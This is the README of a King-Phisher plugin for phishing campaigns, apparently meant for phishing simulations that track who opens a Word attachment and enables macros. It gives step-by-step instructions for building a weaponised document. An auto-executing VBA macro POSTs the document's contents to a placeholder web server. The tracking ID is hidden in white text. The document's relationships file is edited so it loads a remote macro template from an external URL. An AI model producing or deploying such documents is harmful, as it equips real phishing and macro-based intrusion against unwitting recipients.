# King-Phisher Plugin
This plugin will take an docx attachment and embed King Phisher Jinja variables into it when sending the email to a target.
With this plugin you can check how many people opened the Word attachment and choose the option to activate the macro or their macro execution was already active.

# Prerequisites
note: The client and server must not be running.

you can run below command in install king-phisher directory for example, suppose you installed it at /opt/king-phisher then:

    cd /opt/king-phisher

    pipenv install docxtpl
    
# Local install
1- Locate the docx_generator folder in the following path:

    $HOME/.config/king-phisher/plugins
    
2- File mailer.py is located in the following path:

    /opt/king-phisher/king_phisher/client/mailer.py
    
Put the following code in the mailer.py file   

    def render_DOC_template_var(config, target=None, analyze=False):
      """	
            Take a config and return Template variables
      """
      if target is None:
        target = MessageTargetPlaceholder(uid=config['server_config'].get('server.secret_id'))
        template_environment.set_mode(template_environment.MODE_PREVIEW)
      print(target)
      if analyze:
        template_environment.set_mode(template_environment.MODE_ANALYZE)

      template_vars = {}
      template_vars['campaign'] = dict(
        id=str(config['campaign_id']),
        name=config['campaign_name']
      )
      template_vars['client'] = dict(
        first_name=target.first_name,
        last_name=target.last_name,
        email_address=target.email_address,
        department=target.department,
        company_name=config.get('mailer.company_name'),
        message_id=target.uid
      )

      template_vars['sender'] = dict(
        email=config.get('mailer.source_email'),
        friendly_alias=config.get('mailer.source_email_alias'),
        reply_to=config.get('mailer.reply_to_email')
      )
      template_vars['uid'] = target.uid

      message_type = config.get('mailer.message_type', 'email')
      template_vars['message_type'] = message_type
      if message_type == 'calendar_invite':
        template_vars['calendar_invite'] = dict(
          all_day=config.get('mailer.calendar_invite_all_day'),
          location=config.get('mailer.calendar_invite_location'),
          start=get_invite_start_from_config(config),
          summary=config.get('mailer.calendar_invite_summary')
        )

      template_vars['message'] = dict(
        attachment=config.get('mailer.attachment_file'),
        importance=config.get('mailer.importance'),
        recipient=dict(
          field=config.get('mailer.target_field', 'to'),
          to=(target.email_address if config.get('mailer.target_field') == 'to' else config.get('mailer.recipient_email_to', '')),
          cc=(target.email_address if config.get('mailer.target_field') == 'cc' else config.get('mailer.recipient_email_cc', '')),
          bcc=(target.email_address if config.get('mailer.target_field') == 'bcc' else '')
        ),
        sensitivity=config.get('mailer.sensitivity'),
        subject=config.get('mailer.subject'),
        template=config.get('mailer.html_file'),
        type=message_type
      )

      webserver_url = config.get('mailer.webserver_url', '')
      webserver_url = urllib.parse.urlparse(webserver_url)
      tracking_image = config['server_config']['server.tracking_image']
      template_vars['webserver'] = webserver_url.netloc
      tracking_url = urllib.parse.urlunparse((webserver_url.scheme, webserver_url.netloc, tracking_image, '', 'id=' + target.uid, ''))
      webserver_url = urllib.parse.urlunparse((webserver_url.scheme, webserver_url.netloc, webserver_url.path, '', '', ''))
      template_vars['tracking_dot_image_tag'] = "<img src=\"{0}\" style=\"display:none\" />".format(tracking_url)

      template_vars_url = {}
      template_vars_url['rickroll'] = 'http://www.youtube.com/watch?v=oHg5SJYRHA0'
      template_vars_url['webserver'] = webserver_url + '?id=' + target.uid
      template_vars_url['webserver_raw'] = webserver_url
      template_vars_url['tracking_dot'] = tracking_url
      template_vars['url'] = template_vars_url
      template_vars.update(template_environment.standard_variables)
      return template_vars
      
3- run server and client of king-phisher. In the client, enter the plugin manager dialog from tools -> manage plugins. From the local install section, check the install and enable docx_generator.

note: docx_generator and pdf_generator can not be activated at the same time

4- create a dotm template with macro on it. in the macro send uid (The unique tracking identifier ) to the landing page when open document file. sample code:

    Sub Auto_Open()
        expl
    End Sub

    Sub AutoOpen()
        expl
    End Sub

    Sub Document_Open()
        expl
    End Sub

    Public Function expl() As Variant

        Set mainStory = ActiveDocument.Content

        Dim MyRequest As Object
        Set MyRequest = CreateObject("WinHttp.WinHttpRequest.5.1")

        MyRequest.Open "POST", "https://[web_server_url]/[landing_page_name]?id=" + mainStory, False
        MyRequest.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
        MyRequest.send (mainStory)

    End Function

5- Create the Word file with the template defined in the previous step and just write the following command in it and whiten its color. 

    {{ secret_id }}
  

6- After completing these steps, you place the template file created in step 4 on the server and change its premission so that it can be downloaded by everyone. Then you have to put the address of this file in the created Word file.To do this, zip the Word file and extract it and go to the following path:

    word_rels\settings.xml.rels
    
And replace the dotm file address with its local address in the Target section. see code below

    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://[web_server_address]/[name].dotm" TargetMode="External"/>     </Relationships>

7- create your campaign and attach your docx file and enjoy it
